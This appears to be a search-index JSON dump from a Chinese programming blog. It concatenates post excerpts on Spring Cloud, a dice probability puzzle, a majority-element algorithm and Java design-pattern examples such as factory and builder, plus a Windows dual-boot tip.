org.springframework.web.bind.annotation.RestController; import org.springframework.web.client.RestTemplate; import java.util.List; /** * @Auther: csp1999 * @Date: 2020/05/17/22:44 * @Description: */ @RestController public class DeptConsumerController { // 理解：消费者，不应该有service层~ // RestTemplate .... 供我们直接调用就可以了！ 注册到Spring中 // (url, 实体：Map ,Class\u003cT\u003e responseType) @Autowired private RestTemplate restTemplate; //提供多种便捷访问远程http服务的方法，简单的Restful服务模板~ //Ribbon:我们这里的地址，应该是一个变量，通过服务名来访问 //private static final String REST_URL_PREFIX = \"http://localhost:8001\"; private static final String REST_URL_PREFI","date":"2021-04-17","objectID":"/posts/springcloud/:0:6","tags":["SpringCloud"],"title":"SpringCloud","uri":"/posts/springcloud/"},{"categories":["算法"],"content":"问题一：一个骰子怎么产生1/7的概率 问题等价于：一个骰子6个面均匀，现在有7个互斥事件，怎么扔能使7个事件均匀分布 答：一个骰子掷两次，共36种等概率的结果。 令其中的35种对应1-7，剩下的一种对应『再掷两次』。 比如：第一个骰子不为6时，第二个骰子掷出几就输出几（1-6，每种有五个可能）。第一个骰子为6，且第二个骰子不为6，输出7（有五个可能）。两个骰子都是6，重掷。于是1-7的概率都是5/36。而且永远掷6的概率是0，一定会在有限次内得到输出。 设第一次的投掷点数为x，第二次的投掷点数为y，则有f(x,y) = (x - 1) * 6 + y。 f(x,y)的取值范围是1~36，按照上述规则，可以达到题目要求 ","date":"2021-04-17","objectID":"/posts/%E9%AA%B0%E5%AD%90%E7%AD%89%E6%A6%82%E7%8E%871-7%E4%B8%8E%E6%95%B0%E7%BB%84/:1:0","tags":[],"title":"骰子等概率1-7与数组","uri":"/posts/%E9%AA%B0%E5%AD%90%E7%AD%89%E6%A6%82%E7%8E%871-7%E4%B8%8E%E6%95%B0%E7%BB%84/"},{"categories":["算法"],"content":"问题二：找出数组中出现次数超过一半的数 现在有一个数组，已知一个数出现的次数超过了一半，请用O(n)的复杂度的算法找出这个数。 提示：出现次数超过一半的数一定只有一个 **方法一：**创建一个unordered_map，key为数组中的数，value为此数出现的次数。遍历一遍数组，用unordered_map统计每个数出现的次数，并用两个值存储目前出现次数最多的数和对应出现的次数。 这个解法是最简单的，我们来分析一下时间复杂度和空间复杂度,由于这个map底层实现使用hash算法来实现的，故时间复杂度可以为O（n），那么空间复杂度呢？很明显也是O(n)的。 public class HalfTimes { public static void main(String args[]){ int array[]={0,1,2,3,4,1,2,1,1,1,1,0,1,0,1,2,1,1,1,1}; int i = solution1(array); System.out.printf(\"数组中出现次数超过一半的数为：\"+i); } public static int solution1(int arrray[]){ Map\u003cInteger,Integer\u003e unordered_map=new HashMap\u003c\u003e(); for(int item:arrray){ if(unordered_map.containsKey(item)){ Integer value=unordered_map.get(item)+1; unordered_map.replace(item,value); }else{ unordered_map.put(item,1); } } Integer num=0; Integer times=arrray.length/2; for(Integer key:unordered_map.keySet()){ if(unordered_map.get(key)\u003etimes){ num=key; times=unordered_map.get(key); } } return num; } } 那能不能把空间复杂度降下来呢？ **方法二：**使用两个变量A和B，其中A存储某个数组中的数，B用来计数。开始时将B初始化为0。 遍历数组，如果B=0，则令A等于当前数，令B等于1；如果当前数与A相同，则B=B+1；如果当前数与A不同，则令B=B-1。遍历结束时，A中的数就是要找的数。为什么呢？因为题目中说了，那个元素一定是占了数组元素个数的一半以上，所以说，当我们每次删除两个不同的数，剩下存储A的值就是我们要求的结果值。 这个算法的时间复杂度是O(n)，空间复杂度为O(1)。 public static int solution2(int array[]){ int a=0; int b=0; for(int item:array){ if(b==0){ a=item; b=1; }else if(a==item){ b++; }else{ b--; } } return a; } {0,1,2,3,4,1,2,1,1,1,1,0,1,0,1,2,1,1,1,1}; 一共20个数，最多的数为1，共12个，其他数8个 必存在才正确 item a b 0 0 1 1 0 0 2 2 1 3 2 0 4 4 1 1 4 0 2 2 1 1 2 0 1 1 1 1 1 2 1 1 3 0 1 2 1 1 3 0 1 2 1 1 3 2 1 2 1 1 3 1 1 4 1 1 5 1 1 6 ","date":"2021-04-17","objectID":"/posts/%E9%AA%B0%E5%AD%90%E7%AD%89%E6%A6%82%E7%8E%871-7%E4%B8%8E%E6%95%B0%E7%BB%84/:2:0","tags":[],"title":"骰子等概率1-7与数组","uri":"/posts/%E9%AA%B0%E5%AD%90%E7%AD%89%E6%A6%82%E7%8E%871-7%E4%B8%8E%E6%95%B0%E7%BB%84/"},{"categories":["设计模式"],"content":"问题一：抽象工厂模式 某系统为了改进数据库操作的性能，自定义数据库连接对象Connection和语句对象Statement,可针对不同类型的数据库提供不同的连接对象和语句对象，如提供Oracle或MySQL专用连接类和语句类，而且用户可以通过配置文件等方式根据实际需要动态更换系统数据库。使用抽象工厂模式设计该系统。要求绘制类图并编程实现。 类图 代码实现： 抽象Connection接口： public interface Connection { } 具体实现类： public class OracleConnection implements Connection { } public class MySQLConnection implements Connection { } 抽象Statement接口： public interface Statement { } 具体实现类： public class MySQLStatement implements Statement { } public class OracleStatement implements Statement { } 抽象工厂类接口： public interface Factory { Connection createConnecttion(); Statement createStatement(); } 具体工厂实现类： public class MySQLFactory implements Factory { @Override public Connection createConnecttion() { System.out.println(\"正在创建MySQLConnection\"); return new MySQLConnection(); } @Override public Statement createStatement() { System.out.println(\"正在创建MySQLStatement\"); return new MySQLStatement(); } } public class OracleFactory implements Factory { @Override public Connection createConnecttion() { System.out.println(\"正在创建OracleConnection\"); return new OracleConnection(); } @Override public Statement createStatement() { System.out.println(\"正在创建OracleStatement\"); return new OracleStatement(); } } 辅助代码： public class XMLUtil { public static Object getType(){ try{ DocumentBuilderFactory documentBuilderFactory=DocumentBuilderFactory.newInstance(); DocumentBuilder documentBuilder=documentBuilderFactory.newDocumentBuilder(); Document document; document= documentBuilder.parse(new File(\"config.xml\")); NodeList nodeList=document.getElementsByTagName(\"type\"); Node classNode=nodeList.item(0).getFirstChild(); String string=classNode.getNodeValue().trim(); Class c=Class.forName(\"cn.hubu.www.\"+string); Object obj=c.newInstance(); return obj; }catch (Exception e) { e.printStackTrace(); return null; } } } client客户端： public class Client { public static void main(String args[]) { try { Connection connection; Statement statement; Factory factory= (Factory) XMLUtil.getType(); connection=factory","date":"2021-04-16","objectID":"/posts/%E5%AE%9E%E9%AA%8C%E4%B8%89---%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/:0:1","tags":["抽象工厂模式","建造者模式"],"title":"实验三---抽象工厂模式、建造者模式","uri":"/posts/%E5%AE%9E%E9%AA%8C%E4%B8%89---%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"问题二：建造者模式 建造者模式实验：某游戏软件中人物角色包括多种类型，不同类型的人物角色，其性别、脸型、服装、发型等外部特性有所差异，使用建造者模式创建人物角色对象，要求绘制类图并编程实现。 代码如下： 人物角色GameRole类： public class GameRole { private String gender; private String face; private String cloth; private String hair; @Override public String toString() { return \"GameRole{\" + \"gender='\" + gender + '\\'' + \", face='\" + face + '\\'' + \", cloth='\" + cloth + '\\'' + \", hair='\" + hair + '\\'' + '}'; } public String getGender() { return this.gender; } public void setGender(String gender) { this.gender = gender; } public String getFace() { return face; } public void setFace(String face) { this.face = face; } public String getCloth() { return cloth; } public void setCloth(String cloth) { this.cloth = cloth; } public String getHair() { return hair; } public void setHair(String hair) { this.hair = hair; } } 抽象建造者类： public abstract class GameRoleBuilder { protected GameRole gameRole=new GameRole(); public abstract void buildGender(); public abstract void buildFace(); public abstract void builCloth(); public abstract void buildHair(); public GameRole getGameRole(){ return this.gameRole; } } 具体建造者类SubGameRoleBuilderA： public class SubGameRoleBuilderA extends GameRoleBuilder { @Override public void buildGender() { gameRole.setGender(\"男\"); } @Override public void buildFace() { gameRole.setFace(\"英俊帅气\"); } @Override public void builCloth() { gameRole.setCloth(\"李宁服饰\"); } @Override public void buildHair() { gameRole.setHair(\"黑色\"); } } 具体建造者类SubGameRoleBuilderB： public class SubGameRoleBuilderB extends GameRoleBuilder { @Override public void buildGender() { gameRole.setGender(\"女\"); } @Override public void buildFace() { gameRole.setFace(\"瓜子脸\"); } @Override public void builCloth() { gameRole.setCloth(\"JK\"); } @Override public void buildHair() { gameRole.setHair(\"黄色\"); } } 指挥者Director类： public class Director { private GameRoleBuilder gameRoleBuilder; public void setGameRoleBuilder(GameRoleBuilder gameRoleBuilder){ this.gameRoleBuilder=gameRoleBuilder; } public GameRole construct(){ g","date":"2021-04-16","objectID":"/posts/%E5%AE%9E%E9%AA%8C%E4%B8%89---%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/:0:2","tags":["抽象工厂模式","建造者模式"],"title":"实验三---抽象工厂模式、建造者模式","uri":"/posts/%E5%AE%9E%E9%AA%8C%E4%B8%89---%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"区别： ​ 抽象工厂模式比建造者模式的尺度要大，它关注产品整体，而建造者模式关注构建过程，因此建造者模式可以很容易地构建出一个崭新的产品，只要导演类能够提供具体的工艺流程。也正因为如此，两者的应用场景截然不同，如果希望屏蔽对象的创建过程，只提供一个封装良好的对象，则可以选择抽象工厂方法模式。而建造者模式可以用在构件的装配方面，如通过装配不同的组件或者相同组件的不同顺序，可以产生出一个新的对象，它可以产生一个非常灵活的架构，方便地扩展和维护系统。 ","date":"2021-04-16","objectID":"/posts/%E5%AE%9E%E9%AA%8C%E4%B8%89---%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/:0:3","tags":["抽象工厂模式","建造者模式"],"title":"实验三---抽象工厂模式、建造者模式","uri":"/posts/%E5%AE%9E%E9%AA%8C%E4%B8%89---%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["Windows"],"content":"最近新装的系统发现开机出现了两个引导，一个Windows10，一个Windows，但是只有第一个可以用，第二个用不了，那留着有什么用呢？果断删掉或禁用 Win+R输入msconfig，看到系统配置引导界面果然有两个引导，尝试删除一个，因为Windows10可用，就把第二个删除： 发现系统不让删除，不知道什么鬼畜操作，不让删除那就另寻捷径！！！ 打开此电脑属性，选择高级系统设置，选择高级，启动和故障恢复设置，取消勾选显示操作系统事件列表 设置完成后进入系统就直接进入默认的操作系统，而不会出现选择列表了哦 ","date":"2021-04-16","objectID":"/posts/windows%E5%8F%8C%E5%BC%95%E5%AF%BC%E5%85%B3%E9%97%AD/:0:0","tags":["双引导解决"],"title":"Windows双引导关闭","uri":"/posts/windows%E5%8F%8C%E5%BC%95%E5%AF%BC%E5%85%B3%E9%97%AD/"},{"categories":["设计模式"],"content":"模式动机 ","date":"2021-04-16","objectID":"/posts/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/:1:0","tags":["建造者模式"],"title":"建造者模式","uri":"/posts/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式定义 建造者模式(Builder Pattern)：将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示。 建造者模式是一步一步创建一个复杂的对象，它允许用户只通过指定复杂对象的类型和内容就可以构建它们，用户不需要知道内部的具体构建细节。建造者模式属于对象创建型模式。 ","date":"2021-04-16","objectID":"/posts/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/:2:0","tags":["建造者模式"],"title":"建造者模式","uri":"/posts/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式分析 将客户端与包含多个部件的复杂对象的创建过程分离，客户端无须知道复杂对象的内部组成部分与装配方式，只需要知道所需建造者的类型即可 关注如何逐步创建一个复杂的对象，不同的建造者定义了不同的创建过程 ","date":"2021-04-16","objectID":"/posts/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/:3:0","tags":["建造者模式"],"title":"建造者模式","uri":"/posts/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"代码示例 建造者模式可以用于描述KFC如何创建套餐：套餐是一个复杂对象，它一般包含主食（如汉堡、鸡肉卷等）和饮料（如果汁、可乐等）等组成部分，不同的套餐有不同的组成部分，而KFC的服务员可以根据顾客的要求，一步一步装配这些组成部分，构造一份完整的套餐，然后返回给顾客。 产品类Meal： public class Meal { private String food; private String drink; public String getFood() { return food; } public void setFood(String food) { this.food = food; } public String getDrink() { return drink; } public void setDrink(String drink) { this.drink = drink; } } 抽象建造者类MealBuilder: public abstract class MealBuilder { protected Meal meal=new Meal(); public abstract void buildFood(); public abstract void buildDrink(); public Meal getMeal(){ return this.meal; } } 具体建造者类（A套餐） public class SubMealBuilderA extends MealBuilder { @Override public void buildFood() { meal.setFood(\"一个鸡腿\"); } @Override public void buildDrink() { meal.setDrink(\"一杯可乐\"); } } 具体建造者类（B套餐） public class SubMealBuilderB extends MealBuilder { @Override public void buildFood() { meal.setFood(\"一个鸡肉卷\"); } @Override public void buildDrink() { meal.setDrink(\"一杯果汁\"); } } 指挥者类（KFCWaiter） public class KFCWaiter { private MealBuilder mealBuilder; public void setMealBuilder(MealBuilder mealBuilder){ this.mealBuilder=mealBuilder; } public Meal construct(){ mealBuilder.buildFood(); mealBuilder.buildDrink(); return mealBuilder.getMeal(); } } 辅助代码与前面类似。。。。。。 客户端类： public class Client { public static void main(String args[]) { try { MealBuilder mealBuilder= (MealBuilder) XMLUtilTV.getType(); KFCWaiter kfcWaiter=new KFCWaiter(); kfcWaiter.setMealBuilder(mealBuilder); Meal meal = kfcWaiter.construct(); System.out.println(\"套餐组成\"); System.out.println(meal.getFood()); System.out.println(meal.getDrink()); } catch (Exception e) { e.printStackTrace(); } } } ","date":"2021-04-16","objectID":"/posts/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/:4:0","tags":["建造者模式"],"title":"建造者模式","uri":"/posts/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"优点 客户端不必知道产品内部组成的细节，将产品本身与产品的创建过程解耦，使得相同的创建过程可以创建不同的产品对象 每一个具体建造者都相对独立，与其他的具体建造者无关，因此可以很方便地替换具体建造者或增加新的具体建造者，扩展方便，符合开闭原则 可以更加精细地控制产品的创建过程 ","date":"2021-04-16","objectID":"/posts/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/:5:0","tags":["建造者模式"],"title":"建造者模式","uri":"/posts/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"缺点 建造者模式所创建的产品一般具有较多的共同点，其组成部分相似，如果产品之间的差异性很大，不适合使用建造者模式，因此其使用范围受到一定的限制 如果产品的内部变化复杂，可能会需要定义很多具体建造者类来实现这种变化，导致系统变得很庞大，增加了系统的理解难度和运行成本 ","date":"2021-04-16","objectID":"/posts/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/:6:0","tags":["建造者模式"],"title":"建造者模式","uri":"/posts/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"应用场景 需要生成的产品对象有复杂的内部结构，这些产品对象通常包含多个成员变量 需要生成的产品对象的属性相互依赖，需要指定其生成顺序 对象的创建过程独立于创建该对象的类。在建造者模式中通过引入了指挥者类，将创建过程封装在指挥者类中，而不在建造者类和客户类中 隔离复杂对象的创建和使用，并使得相同的创建过程可以创建不同的产品 ","date":"2021-04-16","objectID":"/posts/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/:7:0","tags":["建造者模式"],"title":"建造者模式","uri":"/posts/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式动机 **产品等级结构：**产品等级结构即产品的继承结构，例如一个抽象类是电视机，其子类有海尔电视机、海信电视机、TCL电视机，则抽象电视机与具体品牌的电视机之间构成了一个产品等级结构，抽象电视机是父类，而具体品牌的电视机是其子类。 **产品族：**在抽象工厂模式中，产品族是指由同一个工厂生产的，位于不同产品等级结构中的一组产品，例如海尔电器工厂生产的海尔电视机、海尔电冰箱，海尔电视机位于电视机产品等级结构中，海尔电冰箱位于电冰箱产品等级结构中。 ","date":"2021-04-16","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:1:0","tags":["抽象工厂模式"],"title":"抽象工厂模式","uri":"/posts/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式定义 抽象工厂模式(Abstract Factory Pattern)：提供一个创建一系列相关或相互依赖对象的接口，而无须指定它们具体的类。抽象工厂模式又称为Kit模式，属于对象创建型模式。 ","date":"2021-04-16","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:2:0","tags":["抽象工厂模式"],"title":"抽象工厂模式","uri":"/posts/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式分析 ","date":"2021-04-16","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:3:0","tags":["抽象工厂模式"],"title":"抽象工厂模式","uri":"/posts/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"代码示例 一个电器工厂可以产生多种类型的电器，如海尔工厂可以生产海尔电视机、海尔空调等，TCL工厂可以生产TCL电视机、TCL空调等，相同品牌的电器构成一个产品族，而相同类型的电器构成了一个产品等级结构，现使用抽象工厂模式模拟该场景。 抽象产品接口： public interface TV { public void play(); } 具体产品类： public class HairTV implements TV { @Override public void play() { System.out.println(\"海尔电视播放中、、、、、\"); } } public class HisenseTV implements TV { @Override public void play() { System.out.println(\"海信电视播放中、、、\"); } } 抽象工厂类： public interface Factory { TV produceTV(); AirCondition produceAC(); } 具体工厂类: public class HairFactory implements Factory { @Override public TV produceTV() { System.out.println(\"海尔工厂生产海尔电视机。\"); return new HairTV(); } @Override public AirCondition produceAC() { System.out.println(\"海尔工厂生产海尔空调。\"); return new HairAirCondition(); } } public class HisenseFactory implements Factory { @Override public TV produceTV() { System.out.println(\"海信电视机工厂生产海信电视机。\"); return new HisenseTV(); } @Override public AirCondition produceAC() { System.out.println(\"海信没有空调\"); return null; } } public class TCLFactory implements Factory { @Override public TV produceTV() { System.out.println(\"TCL工厂类正在生产电视\"); return new TCLTV(); } @Override public AirCondition produceAC() { System.out.println(\"CL工厂类正在生产空调\"); return new TCLAirCondition(); } } 产品族抽象类： public interface AirCondition { void changeTemp(); } 具体实现类： public class TCLAirCondition implements AirCondition { @Override public void changeTemp() { System.out.println(\"TC课堂正在调节温度\"); } } public class HairAirCondition implements AirCondition { @Override public void changeTemp() { System.out.println(\"海尔空调正在调节温度\"); } } 辅助工具类： public class XMLUtilTV { public static Object getType(){ try{ DocumentBuilderFactory documentBuilderFactory=DocumentBuilderFactory.newInstance(); DocumentBuilder documentBuilder=documentBuilderFactory.newDocumentBuilder(); Document document; document= documentBuilder.parse(new File(\"config.xml\")); NodeList nodeList=document.getElementsByTagName(\"type\"); Node classNode=nodeList.item(0).getFirstChild(); String string=classNode.getNodeValue().t","date":"2021-04-16","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:4:0","tags":["抽象工厂模式"],"title":"抽象工厂模式","uri":"/posts/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"优点 隔离了具体类的生成，使得客户端并不需要知道什么被创建 当一个产品族中的多个对象被设计成一起工作时，它能够保证客户端始终只使用同一个产品族中的对象 增加新的产品族很方便，无须修改已有系统，符合开闭原则 ","date":"2021-04-16","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:5:0","tags":["抽象工厂模式"],"title":"抽象工厂模式","uri":"/posts/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"缺点 增加新的产品等级结构麻烦，需要对原有系统进行较大的修改，甚至需要修改抽象层代码，这显然会带来较大的不便，违背了开闭原则 ","date":"2021-04-16","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:6:0","tags":["抽象工厂模式"],"title":"抽象工厂模式","uri":"/posts/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"应用场景 一个系统不应当依赖于产品类实例如何被创建、组合和表达的细节 系统中有多于一个的产品族，但每次只使用其中某一产品族 属于同一个产品族的产品将在一起使用，这一约束必须在系统的设计中体现出来 产品等级结构稳定，在设计完成之后不会向系统中增加新的产品等级结构或者删除已有的产品等级结构 ","date":"2021-04-16","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:7:0","tags":["抽象工厂模式"],"title":"抽象工厂模式","uri":"/posts/%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式动机 ","date":"2021-04-16","objectID":"/posts/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/:1:0","tags":["工厂方法模式"],"title":"工厂方法模式","uri":"/posts/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式定义 工厂方法模式(Factory Method Pattern)简称工厂模式，也叫虚拟构造器(Virtual Constructor)模式或者多态工厂(Polymorphic Factory)模式，它属于类创建型模式。 在工厂方法模式中，工厂父类负责定义创建产品对象的公共接口，而工厂子类则负责生成具体的产品对象，这样做的目的是将产品类的实例化操作延迟到工厂子类中完成，即通过工厂子类来确定究竟应该实例化哪一个具体产品类。 ","date":"2021-04-16","objectID":"/posts/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/:2:0","tags":["工厂方法模式"],"title":"工厂方法模式","uri":"/posts/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式分析 工厂方法模式是简单工厂模式的进一步抽象和推广 工厂方法模式保持了简单工厂模式的优点，并克服了它的缺点 核心的工厂类不再负责所有产品的创建，而是将具体创建工作交给其子类去完成 可以允许系统在不修改工厂角色的情况下引进新产品 增加具体产品–\u003e增加具体工厂，符合“开闭原则” ","date":"2021-04-16","objectID":"/posts/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/:3:0","tags":["工厂方法模式"],"title":"工厂方法模式","uri":"/posts/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"代码示例 将原有的电视机工厂进行分割，为每种品牌的电视机提供一个子工厂，海尔工厂专门负责生产海尔电视机，海信工厂专门负责生产海信电视机，如果需要生产TCL电视机或创维电视机，只需要对应增加一个新的TCL工厂或创维工厂即可，原有的工厂无须做任何修改，使得整个系统具有更加的灵活性和可扩展性。 抽象产品接口： public interface TV { public void play(); } 具体产品类： public class HairTV implements TV { @Override public void play() { System.out.println(\"海尔电视播放中、、、、、\"); } } public class HisenseTV implements TV { @Override public void play() { System.out.println(\"海信电视播放中、、、\"); } } 抽象工厂类： public interface TVFactory { public TV produceTV(); } 具体工厂类: public class HisenseTVFactory implements TVFactory { @Override public TV produceTV() { System.out.println(\"海信电视机工厂生产海信电视机。\"); return new HisenseTV(); } } public class HairTVFactory implements TVFactory { @Override public TV produceTV() { System.out.println(\"海尔电视机工厂生产海尔电视机。\"); return new HairTV(); } } 辅助工具类： public class XMLUtilTV { public static Object getType(){ try{ DocumentBuilderFactory documentBuilderFactory=DocumentBuilderFactory.newInstance(); DocumentBuilder documentBuilder=documentBuilderFactory.newDocumentBuilder(); Document document; document= documentBuilder.parse(new File(\"config.xml\")); NodeList nodeList=document.getElementsByTagName(\"type\"); Node classNode=nodeList.item(0).getFirstChild(); String string=classNode.getNodeValue().trim(); System.out.println(string); Class c=Class.forName(\"io.hubu8.com.\"+string); Object obj=c.newInstance(); return obj; }catch (Exception e) { e.printStackTrace(); return null; } } } xml文件： \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e \u003cconfig\u003e \u003ctype\u003eHairTVFactory\u003c/type\u003e \u003c/config\u003e 客户端： public class Client { public static void main(String args[]) { try { TV tv; TVFactory factory=(TVFactory) XMLUtilTV.getType(); System.out.println(factory); tv=factory.produceTV(); tv.play(); } catch (Exception e) { e.printStackTrace(); } } } HisenseTVFactory io.hubu8.com.HisenseTVFactory@1540e19d 海信电视机工厂生产海信电视机。 海信电视播放中、、、 如果需要新增一种类型的电视，只需要新增一个具体产品类和一个具体工厂类： public class TCLTV implements TV { @Override public void play() { System.out.println(\"TCL电视正在播放中、、、\"); } } publ","date":"2021-04-16","objectID":"/posts/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/:4:0","tags":["工厂方法模式"],"title":"工厂方法模式","uri":"/posts/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"优点 工厂方法用来创建客户所需要的产品，同时还向客户隐藏了哪种具体产品类将被实例化这一细节 能够让工厂自主确定创建何种产品对象，而如何创建这个对象的细节则完全封装在具体工厂内部 在系统中加入新产品时，完全符合开闭原则 ","date":"2021-04-16","objectID":"/posts/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/:5:0","tags":["工厂方法模式"],"title":"工厂方法模式","uri":"/posts/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"缺点 系统中类的个数将成对增加，在一定程度上增加了系统的复杂度，会给系统带来一些额外的开销 增加了系统的抽象性和理解难度 ","date":"2021-04-16","objectID":"/posts/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/:6:0","tags":["工厂方法模式"],"title":"工厂方法模式","uri":"/posts/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"应用场景 客户端不知道它所需要的对象的类（客户端不需要知道具体产品类的类名，只需要知道所对应的工厂即可，具体产品对象由具体工厂类创建） 抽象工厂类通过其子类来指定创建哪个对象 闹眼子呢？ java.lang.ClassNotFoundException: HisenseTVFactory at java.net.URLClassLoader.findClass(URLClassLoader.java:382) at java.lang.ClassLoader.loadClass(ClassLoader.java:418) at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:355) at java.lang.ClassLoader.loadClass(ClassLoader.java:351) at java.lang.Class.forName0(Native Method) at java.lang.Class.forName(Class.java:264) at io.hubu8.com.XMLUtilTV.getType(XMLUtilTV.java:24) at io.hubu8.com.Client.main(Client.java:8) null java.lang.NullPointerException at io.hubu8.com.Client.main(Client.java:11) Process finished with exit code 0 需要在类名前面加上包名： Class c=Class.forName(\"io.hubu8.com.\"+string); ","date":"2021-04-16","objectID":"/posts/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/:7:0","tags":["工厂方法模式"],"title":"工厂方法模式","uri":"/posts/%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式动机 只需要告知水果名称就可以得到相应的水果： ","date":"2021-04-16","objectID":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/:1:0","tags":["简单工厂模式"],"title":"简单工厂模式","uri":"/posts/%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式定义 简单工厂模式(Simple Factory Pattern)：又称为静态工厂方法(Static Factory Method)模式，它属于类创建型模式 在简单工厂模式中，可以根据参数的不同返回不同类的实例 简单工厂模式专门定义一个类来负责创建其他类的实例，被创建的实例通常都具有共同的父类 